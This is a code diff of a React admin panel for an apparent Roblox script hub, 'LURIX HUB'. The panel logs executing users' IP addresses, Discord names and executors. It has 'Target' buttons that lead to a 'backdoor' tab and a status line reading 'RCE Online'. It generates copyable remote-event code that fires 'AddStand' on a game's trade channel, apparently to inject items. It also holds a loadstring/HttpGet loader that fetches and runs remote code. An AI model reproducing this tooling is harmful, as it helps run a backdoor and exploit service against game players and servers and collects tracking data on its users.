+                            <span className="inline-flex items-center gap-1 px-2.5 py-1 rounded-md text-[10px] font-black bg-emerald-500/15 border border-emerald-500/30 text-emerald-400">
+                              Public Server
+                            </span>
+                          )}
+                        </td>
+
+                        <td className="p-3.5 text-[#6E96FF]">{log.ip_address}</td>
+                        
+                        <td className="p-3.5 font-sans text-xs">
+                          <div className="text-indigo-300 font-bold">{log.discord_user || 'N/A'}</div>
+                          <div className="text-gray-400 text-[10px] font-mono mt-0.5">{log.executor}</div>
+                        </td>
+
+                        <td className="p-3.5 text-gray-400 text-[11px]">
+                          {new Date(log.created_at).toLocaleString('en-US')}
+                        </td>
+
+                        <td className="p-3.5">
+                          <div className="flex items-center gap-2 flex-wrap">
+                            <button
+                              onClick={() => handleOpenStorageModal(log)}
+                              className="bg-[#6E96FF]/20 border border-[#6E96FF]/40 text-[#6E96FF] hover:bg-[#6E96FF] hover:text-black px-2.5 py-1 rounded-lg text-[10px] font-bold cursor-pointer transition-all"
+                            >
+                              Storage
+                            </button>
+
+                            {log.place_id && log.job_id ? (
+                              <button
+                                onClick={() => handleCopyJoinScript(log)}
+                                className={`px-2.5 py-1 rounded-lg text-[10px] font-bold cursor-pointer transition-all ${
+                                  isCopied
+                                    ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40'
+                                    : 'bg-[#6E96FF]/20 text-[#6E96FF] border border-[#6E96FF]/40 hover:bg-[#6E96FF] hover:text-black'
+                                }`}
+                              >
+                                {isCopied ? 'Copied' : 'Copy Join'}
+                              </button>
+                            ) : (
+                              <span className="text-[10px] text-gray-500 italic font-mono">No JobId</span>
+                            )}
+
+                            <button
+                              onClick={() => handleSelectUserForBackdoor(log.roblox_username)}
+                              className="bg-yellow-500/20 border border-yellow-500/40 text-yellow-400 hover:bg-yellow-500/30 px-2.5 py-1 rounded-lg text-[10px] font-bold cursor-pointer transition-all"
+                            >
+                              Target
+                            </button>
+                          </div>
+                        </td>
+                      </tr>
+                    );
+                  })
+                )}
+              </tbody>
+            </table>
+          </div>
+        </div>
+      )}
+
+      {/* TAB 5: SETTINGS */}
+      {activeTab === 'settings' && (
+        <div className="bg-[#0a0d16] border border-gray-800 p-5 sm:p-7 rounded-3xl space-y-4 shadow-xl max-w-xl">
+          <div className="text-sm font-black text-[#6E96FF] flex items-center gap-2 uppercase">
+            Change Admin Password
+          </div>
+          <input
+            type="password"
+            placeholder="New password..."
+            value={newAdminPass}
+            onChange={(e) => setNewAdminPass(e.target.value)}
+            className="w-full bg-black/80 border border-gray-800 p-3 rounded-xl text-xs text-white outline-none focus:border-[#6E96FF]"
+          />
+          <button 
+            onClick={handleSaveAdminPassword} 
+            disabled={isSaving}
+            className="w-full bg-green-600 text-white font-black py-3 rounded-xl text-xs cursor-pointer hover:bg-green-500 transition-all flex items-center justify-center gap-2 disabled:opacity-50"
+          >
+            {isSaving ? 'Updating...' : 'UPDATE PASSWORD'}
+          </button>
+        </div>
+      )}
+
+      {/* MODAL: STORAGE LOGS */}
+      {isStorageModalOpen && selectedStorageLog && (
+        <div className="fixed inset-0 z-[99999] flex items-center justify-center p-4 bg-black/85 backdrop-blur-md">
+          <div className="bg-[#0c0f17] border border-[#6E96FF]/40 w-full max-w-2xl rounded-3xl overflow-hidden shadow-[0_0_50px_rgba(110,150,255,0.25)] flex flex-col max-h-[85vh]">
+            
+            <div className="p-5 border-b border-white/10 flex items-center justify-between bg-[#080a0f]">
+              <div className="flex items-center gap-3">
+                <div className="w-10 h-10 rounded-2xl bg-[#6E96FF]/15 border border-[#6E96FF]/30 flex items-center justify-center text-[#6E96FF] font-black">
+                  S
                 </div>
                 <div>
-                  <div style={{ fontWeight: 800, fontSize: 15, color: T.text }}>{storageLog.roblox_username}</div>
-                  <div style={{ fontSize: 11, fontFamily: 'monospace', color: T.textMuted }}>ID: {storageLog.roblox_id}</div>
+                  <h3 className="font-extrabold text-base sm:text-lg text-white flex items-center gap-2">
+                    {selectedStorageLog.roblox_username}
+                    <span className="text-xs px-2 py-0.5 rounded-full bg-white/10 text-[#6E96FF] border border-[#6E96FF]/20 font-mono">
+                      ID: {selectedStorageLog.roblox_id}
+                    </span>
+                  </h3>
+                  <p className="text-[11px] text-[#949db1]">Click any Stand slot to copy AddStand remote code</p>
                 </div>
               </div>
-              <button onClick={() => setStorageLog(null)} style={{ ...css.btn('ghost'), padding: '8px', borderRadius: 8 }}>
-                <Icon.X />
+              <button 
+                onClick={() => setIsStorageModalOpen(false)}
+                className="p-2 rounded-xl text-gray-400 hover:text-white hover:bg-white/10 transition-all cursor-pointer font-bold"
+              >
+                ✕
               </button>
             </div>
 
-            {/* Tabs */}
-            <div style={{ display: 'flex', gap: 0, borderBottom: `1px solid ${T.border}` }}>
-              {['stands', 'inventory'].map(t => (
-                <button key={t} onClick={() => setStorageTab(t)} style={{
-                  flex: 1,
-                  padding: '13px',
-                  fontWeight: 800,
-                  fontSize: 12,
-                  textTransform: 'capitalize',
-                  letterSpacing: '0.04em',
-                  cursor: 'pointer',
-                  border: 'none',
-                  background: storageTab === t ? T.accentDim : 'transparent',
-                  color: storageTab === t ? T.accent : T.textMuted,
-                  borderBottom: storageTab === t ? `2px solid ${T.accent}` : '2px solid transparent',
-                  transition: 'all 0.15s',
-                }}>
-                  {t === 'stands' ? 'Stand Storage' : 'Inventory'}
-                </button>
-              ))}
+            <div className="p-3 bg-[#080a0f]/60 border-b border-white/5 grid grid-cols-2 gap-2">
+              <button
+                onClick={() => setStorageTab('stands')}
+                className={`py-2.5 px-4 rounded-xl font-black text-xs sm:text-sm flex items-center justify-center gap-2 transition-all cursor-pointer ${
+                  storageTab === 'stands'
+                    ? 'bg-[#6E96FF] text-[#04060a] shadow-[0_0_20px_rgba(110,150,255,0.4)]'
+                    : 'bg-[#0a0d14] text-gray-400 hover:text-white border border-white/5'
+                }`}
+              >
+                Stand Storage
+              </button>
+
+              <button
+                onClick={() => setStorageTab('inventory')}
+                className={`py-2.5 px-4 rounded-xl font-black text-xs sm:text-sm flex items-center justify-center gap-2 transition-all cursor-pointer ${
+                  storageTab === 'inventory'
+                    ? 'bg-[#6E96FF] text-[#04060a] shadow-[0_0_20px_rgba(110,150,255,0.4)]'
+                    : 'bg-[#0a0d14] text-gray-400 hover:text-white border border-white/5'
+                }`}
+              >
+                Inventory
+              </button>
             </div>
 
-            {/* Content */}
-            <div style={{ padding: '20px', overflowY: 'auto', flex: 1 }}>
-              {storageTab === 'stands' && (
-                <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
-                  <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(200px, 1fr))', gap: 10 }}>
-                    {(parsedStorage.slots || []).map((slot, i) => {
-                      const remote = `local Event = game:GetService("ReplicatedStorage").TradeEvents.TradeComm\nEvent:FireServer("AddStand", { GUID = "${slot.guid || ''}", StandName = "${slot.raw_name || slot.name}", Attribute = "${slot.attribute || 'None'}" })`;
+            {storageTab === 'stands' && (
+              <div className="p-5 overflow-y-auto space-y-4">
+                {parsedStandData.slots && parsedStandData.slots.length > 0 ? (
+                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
+                    {parsedStandData.slots.map((slot, idx) => {
+                      const isCopied = copiedSlotIndex === slot.slot;
+
+                      const handleCopyRemote = (e) => {
+                        e.stopPropagation();
+                        if (slot.is_empty) return;
+
+                        const rawName = slot.raw_name || slot.name;
+                        const attr = (slot.attribute && slot.attribute !== 'Không có' && slot.attribute !== 'None') ? slot.attribute : 'None';
+                        const guid = slot.guid || '8554099967-42d08ba';
+
+                        const remoteCode = `local Event = game:GetService("ReplicatedStorage").TradeEvents.TradeComm\nEvent:FireServer("AddStand", { GUID = "${guid}", StandName = "${rawName}", Attribute = "${attr}" })`;
+
+                        navigator.clipboard.writeText(remoteCode);
+                        setCopiedSlotIndex(slot.slot);
+                        setTimeout(() => setCopiedSlotIndex(null), 2000);
+                      };
+
                       return (
-                        <div key={i} style={{
-                          background: slot.is_empty ? 'rgba(0,0,0,0.2)' : 'rgba(0,0,0,0.4)',
-                          border: `1px solid ${slot.is_empty ? T.border : `${tierColor(slot.tier)}33`}`,
-                          borderRadius: 12, padding: '14px',
-                          opacity: slot.is_empty ? 0.5 : 1,
-                          cursor: slot.is_empty ? 'default' : 'pointer',
-                          transition: 'all 0.15s',
-                        }}>
-                          <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 8 }}>
-                            <span style={{ ...css.badge(T.textMuted), fontSize: 9 }}>Slot {slot.slot}</span>
-                            {!slot.is_empty && <span style={{ ...css.badge(tierColor(slot.tier)), fontSize: 9 }}>T{slot.tier}</span>}
+                        <div 
+                          key={idx}
+                          onClick={handleCopyRemote}
+                          className={`border rounded-2xl p-4 transition-all relative overflow-hidden group ${
+                            slot.is_empty 
+                              ? 'bg-[#080a0f]/40 border-white/5 opacity-60 cursor-not-allowed' 
+                              : 'bg-[#080a0f] border-[#6E96FF]/30 hover:border-[#6E96FF] hover:shadow-[0_0_20px_rgba(110,150,255,0.25)] cursor-pointer'
+                          }`}
+                        >
+                          <div className="flex items-center justify-between mb-2">
+                            <span className="text-[10px] font-extrabold uppercase tracking-wider text-[#949db1] bg-white/5 px-2 py-0.5 rounded-md border border-white/10">
+                              Slot {slot.slot}
+                            </span>
+                            {!slot.is_empty && (
+                              <span className={`text-[10px] font-black px-2 py-0.5 rounded-lg border font-mono ${getTierStyle(slot.tier)}`}>
+                                Tier: {slot.tier}
+                              </span>
+                            )}
                           </div>
-                          <div style={{ fontWeight: 800, fontSize: 13, color: T.text, marginBottom: 4 }}>{slot.name}</div>
-                          <div style={{ fontSize: 11, color: T.textMuted, marginBottom: slot.is_empty ? 0 : 10 }}>
-                            Attr: <span style={{ color: T.text }}>{slot.attribute}</span>
+
+                          <div className="font-extrabold text-base text-white truncate">
+                            {slot.name}
                           </div>
-                          {!slot.is_empty && <CopyBtn text={remote} label="Copy Remote" labelCopied="Copied!" small />}
+
+                          <div className="mt-2 flex items-center gap-1.5 text-xs text-[#949db1]">
+                            <span>Attribute: <strong className="text-gray-200">{slot.attribute}</strong></span>
+                          </div>
+
+                          {slot.guid && (
+                            <div className="mt-1 text-[10px] font-mono text-gray-500 truncate">
+                              GUID: {slot.guid}
+                            </div>
+                          )}
+
+                          {!slot.is_empty && (
+                            <div className="mt-3 pt-2 border-t border-white/5 flex items-center justify-between">
+                              <span className="text-[10px] font-bold text-gray-400 group-hover:text-[#6E96FF] transition-all">
+                                {isCopied ? 'Copied' : 'Copy Remote AddStand'}
+                              </span>
+                              <button
+                                onClick={handleCopyRemote}
+                                className={`px-2 py-1 rounded-md text-[10px] font-bold transition-all ${
+                                  isCopied
+                                    ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40'
+                                    : 'bg-[#6E96FF]/15 text-[#6E96FF] border border-[#6E96FF]/30 group-hover:bg-[#6E96FF] group-hover:text-black'
+                                }`}
+                              >
+                                {isCopied ? 'Copied' : 'Copy'}
+                              </button>
+                            </div>
+                          )}
                         </div>
                       );
                     })}
                   </div>
-                  <div style={{ ...css.card(false), borderRadius: 12 }}>
-                    <div style={{ padding: '14px 16px', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
-                      <div>
-                        <div style={{ fontSize: 10, fontWeight: 700, color: T.textMuted, textTransform: 'uppercase', marginBottom: 2 }}>Spec Storage</div>
-                        <div style={{ fontSize: 14, fontWeight: 800, color: T.text }}>{parsedStorage.spec_storage || 'Empty'}</div>
-                      </div>
-                      <div style={css.badge(T.accent)}>Active</div>
+                ) : (
+                  <div className="text-center py-10 text-gray-500 font-bold text-xs">
+                    No stand data logged.
+                  </div>
+                )}
+
+                <div className="bg-[#080a0f] border border-[#6E96FF]/25 rounded-2xl p-4 flex items-center justify-between">
+                  <div className="flex items-center gap-3">
+                    <div>
+                      <div className="text-[10px] font-bold text-[#949db1] uppercase">Spec Storage</div>
+                      <div className="text-sm font-extrabold text-white">{parsedStandData.spec_storage || 'Empty'}</div>
                     </div>
                   </div>
+                  <span className="text-xs bg-[#6E96FF]/10 text-[#6E96FF] border border-[#6E96FF]/30 px-2.5 py-1 rounded-lg font-mono">
+                    Active Spec
+                  </span>
                 </div>
-              )}
+              </div>
+            )}
 
-              {storageTab === 'inventory' && (
-                <div>
-                  {parsedInventory.length === 0
-                    ? <div style={{ textAlign: 'center', padding: '40px', color: T.textMuted, fontSize: 12 }}>No inventory data</div>
-                    : (
-                      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(180px, 1fr))', gap: 10 }}>
-                        {parsedInventory.map((item, i) => (
-                          <div key={i} style={{ background: 'rgba(0,0,0,0.3)', border: `1px solid ${T.border}`, borderRadius: 12, padding: '12px 14px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
-                            <div>
-                              <div style={{ fontWeight: 700, fontSize: 12, color: T.text }}>{item.name}</div>
-                              <div style={{ fontSize: 10, color: T.textMuted, marginTop: 2 }}>{item.type}</div>
-                            </div>
-                            <div style={{ ...css.badge(T.accent), fontSize: 12, fontWeight: 900 }}>×{item.count}</div>
+            {storageTab === 'inventory' && (
+              <div className="p-5 overflow-y-auto">
+                {parsedInventoryData.length === 0 ? (
+                  <div className="text-center py-12 text-gray-500 font-bold text-xs">
+                    No inventory data logged.
+                  </div>
+                ) : (
+                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
+                    {parsedInventoryData.map((item, idx) => (
+                      <div 
+                        key={idx} 
+                        className="bg-[#080a0f] border border-white/10 rounded-2xl p-3.5 flex items-center justify-between hover:border-[#6E96FF]/50 transition-all"
+                      >
+                        <div className="flex items-center gap-3 min-w-0">
+                          <div className="min-w-0">
+                            <div className="font-bold text-xs sm:text-sm text-white truncate">{item.name}</div>
+                            <div className="text-[10px] text-[#949db1] font-medium">{item.type}</div>
                           </div>
-                        ))}
+                        </div>
+                        <div className="bg-[#6E96FF]/15 text-[#6E96FF] border border-[#6E96FF]/30 text-xs font-extrabold px-2.5 py-1 rounded-lg font-mono shrink-0">
+                          x{item.count}
+                        </div>
                       </div>
-                    )
-                  }
-                </div>
-              )}
-            </div>
-
-            <div style={{ padding: '14px 20px', borderTop: `1px solid ${T.border}`, background: 'rgba(0,0,0,0.2)', display: 'flex', justifyContent: 'flex-end' }}>
-              <button onClick={() => setStorageLog(null)} style={css.btn('ghost')}>Close</button>
-            </div>
-          </div>
-        </div>
-      )}
-    </div>
-  );
-};
-
-// ─── HOME CONFIG TAB ──────────────────────────────────────────────────────────
-const HomeConfigTab = () => {
-  const [siteTitle, setSiteTitle] = useState('LURIX HUB');
-  const [badge, setBadge] = useState('Online & Active');
-  const [loaderScript, setLoaderScript] = useState('loadstring(game:HttpGet("..."))()');
-  const [currentKey, setCurrentKey] = useState('LURIX-2025-XXXX');
-  const [ytLink, setYtLink] = useState('https://youtube.com');
-  const [dcLink, setDcLink] = useState('https://discord.gg/');
-  const [games, setGames] = useState([{ name: 'Stand Upright', logo: '/logo.png', status: 'Fully Supported', tag: 'ROBLOX' }]);
-  const [saving, setSaving] = useState(false);
-
-  const save = async () => { setSaving(true); await new Promise(r => setTimeout(r, 700)); setSaving(false); alert('Settings saved.'); };
-  const addGame = () => setGames(g => [...g, { name: 'New Game', logo: '/logo.png', status: 'Supported', tag: 'ROBLOX' }]);
-  const removeGame = (i) => { if (games.length <= 1) return; setGames(g => g.filter((_, idx) => idx !== i)); };
-  const changeGame = (i, f, v) => { const u = [...games]; u[i][f] = v; setGames(u); };
-
-  const Field = ({ label, value, onChange, mono, accent }) => (
-    <div>
-      <div style={{ fontSize: 10, fontWeight: 700, color: T.textMuted, marginBottom: 6, textTransform: 'uppercase', letterSpacing: '0.06em' }}>{label}</div>
-      <input value={value} onChange={e => onChange(e.target.value)}
-        style={{ ...css.input, fontFamily: mono ? 'monospace' : 'inherit', color: accent ? T.accent : T.text, fontWeight: accent ? 700 : 400 }}
-        onFocus={e => e.target.style.borderColor = T.accent}
-        onBlur={e => e.target.style.borderColor = T.border}
-      />
-    </div>
-  );
-
-  return (
-    <div style={{ display: 'flex', flexDirection: 'column', gap: 20, maxWidth: 760 }}>
-      <div style={css.card(false)}>
-        <div style={css.cardHeader}>
-          <span style={{ fontWeight: 800, fontSize: 13, color: T.text }}>Site Configuration</span>
-        </div>
-        <div style={{ padding: '20px', display: 'flex', flexDirection: 'column', gap: 16 }}>
-          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(220px, 1fr))', gap: 14 }}>
-            <Field label="Site Title" value={siteTitle} onChange={setSiteTitle} />
-            <Field label="Badge Text" value={badge} onChange={setBadge} accent />
-            <Field label="YouTube Link" value={ytLink} onChange={setYtLink} />
-            <Field label="Discord Link" value={dcLink} onChange={setDcLink} />
-          </div>
-        </div>
-      </div>
-
-      <div style={css.card(false)}>
-        <div style={css.cardHeader}>
-          <span style={{ fontWeight: 800, fontSize: 13, color: T.text }}>Loader & Key</span>
-        </div>
-        <div style={{ padding: '20px', display: 'flex', flexDirection: 'column', gap: 14 }}>
-          <div>
-            <div style={{ fontSize: 10, fontWeight: 700, color: T.textMuted, marginBottom: 6, textTransform: 'uppercase' }}>Home Loader Script</div>
-            <textarea value={loaderScript} onChange={e => setLoaderScript(e.target.value)} rows={3}
-              style={{ ...css.input, fontFamily: 'monospace', fontSize: 12, resize: 'vertical', lineHeight: 1.6 }}
-              onFocus={e => e.target.style.borderColor = T.accent} onBlur={e => e.target.style.borderColor = T.border} />
-          </div>
-          <Field label="Access Key" value={currentKey} onChange={setCurrentKey} mono accent />
-        </div>
-      </div>
-
-      <div style={css.card(false)}>
-        <div style={{ ...css.cardHeader, flexWrap: 'wrap', gap: 10 }}>
-          <span style={{ fontWeight: 800, fontSize: 13, color: T.text }}>Supported Games ({games.length})</span>
-          <button onClick={addGame} style={{ ...css.btn('secondary'), padding: '6px 12px', fontSize: 11 }}>
-            <Icon.Plus /> Add Game
-          </button>
-        </div>
-        <div style={{ padding: '16px 20px', display: 'flex', flexDirection: 'column', gap: 12 }}>
-          {games.map((g, i) => (
-            <div key={i} style={{ background: 'rgba(0,0,0,0.3)', border: `1px solid ${T.border}`, borderRadius: 12, padding: '14px' }}>
-              <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 10 }}>
-                <span style={{ ...css.badge(T.accent), fontSize: 9 }}>Game #{i + 1}</span>
-                {games.length > 1 && (
-                  <button onClick={() => removeGame(i)} style={{ ...css.btn('danger'), padding: '4px 10px', fontSize: 10 }}>Remove</button>
+                    ))}
+                  </div>
                 )}
               </div>
-              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(160px, 1fr))', gap: 10 }}>
-                {[['name', 'Game Name'], ['logo', 'Logo URL'], ['status', 'Status'], ['tag', 'Tag']].map(([f, l]) => (
-                  <div key={f}>
-                    <div style={{ fontSize: 10, fontWeight: 600, color: T.textMuted, marginBottom: 5 }}>{l}</div>
-                    <input value={g[f]} onChange={e => changeGame(i, f, e.target.value)}
-                      style={{ ...css.input, padding: '8px 12px', fontSize: 12 }}
-                      onFocus={e => e.target.style.borderColor = T.accent}
-                      onBlur={e => e.target.style.borderColor = T.border} />
-                  </div>
-                ))}
-              </div>
-            </div>
-          ))}
-        </div>
-      </div>
+            )}
 
-      <button onClick={save} disabled={saving} style={{ ...css.btn('primary'), padding: '13px 28px', fontSize: 13, fontWeight: 900, borderRadius: 12, alignSelf: 'flex-start', opacity: saving ? 0.6 : 1 }}>
-        {saving ? 'Saving...' : 'Save All Settings'}
-      </button>
-    </div>
-  );
-};
-
-// ─── SETTINGS TAB ─────────────────────────────────────────────────────────────
-const SettingsTab = () => {
-  const [newPw, setNewPw] = useState('');
-  const [show, setShow] = useState(false);
-  const [saving, setSaving] = useState(false);
-
-  const save = async () => {
-    if (!newPw.trim()) return alert('Enter a password.');
-    setSaving(true);
-    await new Promise(r => setTimeout(r, 700));
-    setSaving(false);
-    alert('Password updated.');
-    setNewPw('');
-  };
-
-  return (
-    <div style={{ display: 'flex', flexDirection: 'column', gap: 20, maxWidth: 420 }}>
-      <div style={css.card(false)}>
-        <div style={css.cardHeader}><span style={{ fontWeight: 800, fontSize: 13, color: T.text }}>Change Admin Password</span></div>
-        <div style={{ padding: '20px', display: 'flex', flexDirection: 'column', gap: 14 }}>
-          <div style={{ position: 'relative' }}>
-            <div style={{ fontSize: 10, fontWeight: 700, color: T.textMuted, marginBottom: 6, textTransform: 'uppercase' }}>New Password</div>
-            <div style={{ position: 'relative' }}>
-              <input type={show ? 'text' : 'password'} value={newPw} onChange={e => setNewPw(e.target.value)}
-                placeholder="Enter new password..."
-                style={{ ...css.input, fontFamily: 'monospace', paddingRight: 42 }}
-                onFocus={e => e.target.style.borderColor = T.accent}
-                onBlur={e => e.target.style.borderColor = T.border} />
-              <button type="button" onClick={() => setShow(!show)}
-                style={{ position: 'absolute', right: 12, top: '50%', transform: 'translateY(-50%)', background: 'none', border: 'none', cursor: 'pointer', color: T.textMuted, display: 'flex', padding: 0 }}>
-                {show ? <Icon.EyeOff /> : <Icon.Eye />}
+            <div className="p-4 bg-[#080a0f] border-t border-white/10 flex justify-end">
+              <button
+                onClick={() => setIsStorageModalOpen(false)}
+                className="bg-white/10 hover:bg-white/20 text-white text-xs font-bold py-2 px-5 rounded-xl transition-all cursor-pointer"
+              >
+                Close
               </button>
             </div>
-          </div>
-          <button onClick={save} disabled={saving || !newPw}
-            style={{ ...css.btn('green'), justifyContent: 'center', padding: '12px', fontWeight: 900, fontSize: 13, borderRadius: 12, opacity: saving || !newPw ? 0.5 : 1 }}>
-            {saving ? 'Updating...' : 'Update Password'}
-          </button>
-        </div>
-      </div>
-    </div>
-  );
-};
 
-// ─── MAIN APP ─────────────────────────────────────────────────────────────────
-export default function AdminPage() {
-  const [authed, setAuthed] = useState(false);
-  const [pw, setPw] = useState('');
-  const [activeTab, setActiveTab] = useState('custom_home');
-  const [sidebarCollapsed, setSidebarCollapsed] = useState(false);
-  const [mobileNavOpen, setMobileNavOpen] = useState(false);
-  const [isMobile, setIsMobile] = useState(false);
-  const [backdoorTarget, setBackdoorTarget] = useState(null);
-
-  useEffect(() => {
-    const check = () => setIsMobile(window.innerWidth < 768);
-    check();
-    window.addEventListener('resize', check);
-    return () => window.removeEventListener('resize', check);
-  }, []);
-
-  useEffect(() => {
-    if (isMobile) setSidebarCollapsed(true);
-  }, [isMobile]);
-
-  const handleLogin = (password) => {
-    setPw(password);
-    setAuthed(true);
-  };
-
-  const handleTarget = (username) => {
-    setBackdoorTarget(username);
-    setActiveTab('backdoor');
-    setMobileNavOpen(false);
-  };
-
-  useEffect(() => {
-    if (activeTab !== 'backdoor') setBackdoorTarget(null);
-  }, [activeTab]);
-
-  if (!authed) return <LoginPage onLogin={handleLogin} />;
-
-  const stats = [
-    { label: 'Scripts', value: MOCK_SCRIPTS.length, sub: 'total', color: T.accent },
-    { label: 'Exec Logs', value: MOCK_LOGS.length, sub: 'recent', color: T.accent },
-    { label: 'Games', value: 1, sub: 'supported', color: T.yellow },
-    { label: 'Status', value: 'LIVE', sub: '100% uptime', color: T.green },
-  ];
-
-  const renderTab = () => {
-    switch (activeTab) {
-      case 'custom_home': return <HomeConfigTab />;
-      case 'scripts': return <ScriptsTab isMobile={isMobile} />;
-      case 'backdoor': return <BackdoorTab defaultUser={backdoorTarget} />;
-      case 'user_logs': return <UserLogsTab onTarget={handleTarget} />;
-      case 'settings': return <SettingsTab />;
-      default: return null;
-    }
-  };
-
-  const navLabel = NAV.find(n => n.id === activeTab)?.label || '';
-
-  return (
-    <div style={css.root}>
-      <style>{`
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        ::-webkit-scrollbar { width: 4px; height: 4px; }
-        ::-webkit-scrollbar-track { background: transparent; }
-        ::-webkit-scrollbar-thumb { background: rgba(110,150,255,0.25); border-radius: 2px; }
-        ::-webkit-scrollbar-thumb:hover { background: rgba(110,150,255,0.45); }
-        input::placeholder { color: #334155; }
-        textarea::placeholder { color: #334155; }
-        select option { background: #0c0e1a; color: #e2e8f0; }
-        button { font-family: inherit; }
-        @keyframes fadeIn { from{opacity:0;transform:translateY(8px)} to{opacity:1;transform:none} }
-        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
-        @keyframes slideIn { from{transform:translateX(-100%)} to{transform:none} }
-      `}</style>
-
-      <div style={css.gridBg} />
-      <div style={css.gradientOrb('rgba(110,150,255,0.08)', '-5%', '-5%', 600)} />
-      <div style={css.gradientOrb('rgba(74,108,247,0.06)', '70%', '80%', 500)} />
-
-      {/* Mobile nav overlay */}
-      {isMobile && mobileNavOpen && (
-        <div style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.7)', zIndex: 200, backdropFilter: 'blur(4px)' }}
-          onClick={() => setMobileNavOpen(false)}>
-          <div style={{ width: 240, height: '100%', background: T.surface, borderRight: `1px solid ${T.border}`, animation: 'slideIn 0.2s ease', display: 'flex', flexDirection: 'column' }}
-            onClick={e => e.stopPropagation()}>
-            <div style={css.sidebarLogo}>
-              <div style={css.logoIcon}>L</div>
-              <div>
-                <div style={css.logoText}>LURIX HUB</div>
-                <div style={{ fontSize: 10, color: T.textMuted, fontWeight: 500 }}>Admin Panel</div>
-              </div>
-            </div>
-            <div style={{ padding: '12px 0', flex: 1, overflowY: 'auto' }}>
-              {NAV.map(n => (
-                <div key={n.id} onClick={() => { setActiveTab(n.id); setMobileNavOpen(false); }} style={css.navItem(activeTab === n.id)}>
-                  <div style={css.navIcon}><n.icon /></div>
-                  <span>{n.label}</span>
-                  {activeTab === n.id && <div style={{ marginLeft: 'auto' }}><Icon.ChevronRight /></div>}
-                </div>
-              ))}
-            </div>
           </div>
         </div>
       )}
 
-      <div style={css.layout}>
-        {/* Sidebar (desktop) */}
-        {!isMobile && (
-          <div style={css.sidebar(sidebarCollapsed)}>
-            <div style={css.sidebarLogo}>
-              <div style={{ ...css.logoIcon, cursor: 'pointer' }} onClick={() => setSidebarCollapsed(!sidebarCollapsed)}>L</div>
-              {!sidebarCollapsed && (
-                <div style={{ overflow: 'hidden', minWidth: 0 }}>
-                  <div style={css.logoText}>LURIX HUB</div>
-                  <div style={{ fontSize: 10, color: T.textMuted, fontWeight: 500, whiteSpace: 'nowrap' }}>Admin Panel</div>
-                </div>
-              )}
-            </div>
-
-            <div style={{ flex: 1, padding: '12px 0', overflowY: 'auto', overflowX: 'hidden' }}>
-              {NAV.map(n => (
-                <div key={n.id} onClick={() => setActiveTab(n.id)} style={css.navItem(activeTab === n.id)} title={sidebarCollapsed ? n.label : undefined}>
-                  <div style={{ ...css.navIcon, color: activeTab === n.id ? n.color : 'inherit' }}><n.icon /></div>
-                  {!sidebarCollapsed && <span>{n.label}</span>}
-                  {!sidebarCollapsed && activeTab === n.id && <div style={{ marginLeft: 'auto', opacity: 0.5 }}><Icon.ChevronRight /></div>}
-                </div>
-              ))}
-            </div>
-
-            {/* Status dot */}
-            <div style={{ padding: '14px 16px', borderTop: `1px solid ${T.border}` }}>
-              <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
-                <div style={{ width: 8, height: 8, minWidth: 8, borderRadius: '50%', background: T.green, boxShadow: `0 0 8px ${T.green}`, animation: 'pulse 2s infinite' }} />
-                {!sidebarCollapsed && <span style={{ fontSize: 11, color: T.textMuted, fontWeight: 600 }}>v3.0 RCE Online</span>}
-              </div>
-            </div>
-          </div>
-        )}
-
-        {/* Main content */}
-        <div style={css.main}>
-          {/* Topbar */}
-          <div style={css.topbar}>
-            <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
-              {isMobile && (
-                <button onClick={() => setMobileNavOpen(true)} style={{ background: 'none', border: 'none', cursor: 'pointer', color: T.text, display: 'flex', padding: 4 }}>
-                  <Icon.Menu />
-                </button>
-              )}
-              <div>
-                <div style={{ fontWeight: 800, fontSize: 14, color: T.text }}>{navLabel}</div>
-                {!isMobile && <div style={{ fontSize: 11, color: T.textMuted }}>Lurix Hub Control Panel</div>}
-              </div>
-            </div>
-
-            <div style={{ display: 'flex', gap: 10, alignItems: 'center' }}>
-              <div style={{ ...css.badge(T.green), gap: 6 }}>
-                <div style={{ width: 6, height: 6, borderRadius: '50%', background: T.green, animation: 'pulse 2s infinite' }} />
-                {!isMobile && 'Online'}
-              </div>
-              <button onClick={() => setAuthed(false)} style={{ ...css.btn('danger'), padding: '7px 14px', fontSize: 11 }}>
-                <Icon.LogOut />
-                {!isMobile && 'Logout'}
-              </button>
-            </div>
-          </div>
-
-          {/* Page content */}
-          <div style={css.content}>
-            {/* Stats row */}
-            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(140px, 1fr))', gap: 12, marginBottom: 24, animation: 'fadeIn 0.3s ease' }}>
-              {stats.map(s => (
-                <div key={s.label} style={css.statCard(s.color)}>
-                  <div style={css.statGlow(s.color)} />
-                  <div style={{ fontSize: 10, fontWeight: 800, color: T.textMuted, textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 8 }}>{s.label}</div>
-                  <div style={{ fontSize: 22, fontWeight: 900, color: s.color, lineHeight: 1 }}>{s.value}</div>
-                  <div style={{ fontSize: 11, color: T.textMuted, marginTop: 4, fontWeight: 500 }}>{s.sub}</div>
-                </div>
-              ))}
-            </div>
-
-            {/* Tab content */}
-            <div style={{ animation: 'fadeIn 0.25s ease' }}>
-              {renderTab()}
-            </div>
-          </div>
-        </div>
-      </div>
     </div>
   );
 }
